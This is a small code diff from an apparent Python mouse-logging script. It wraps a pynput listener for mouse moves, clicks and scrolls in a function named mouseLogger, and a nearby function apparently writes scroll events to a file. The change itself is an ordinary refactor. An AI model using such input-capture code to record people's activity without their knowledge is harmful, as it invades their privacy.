@@ -32,7 +32,7 @@ def write_file_scrolled(x,y,dx,dy):
 
 
 
-
-with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
-    listener.join()
+def mouseLogger():
+    with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
+        listener.join()
 
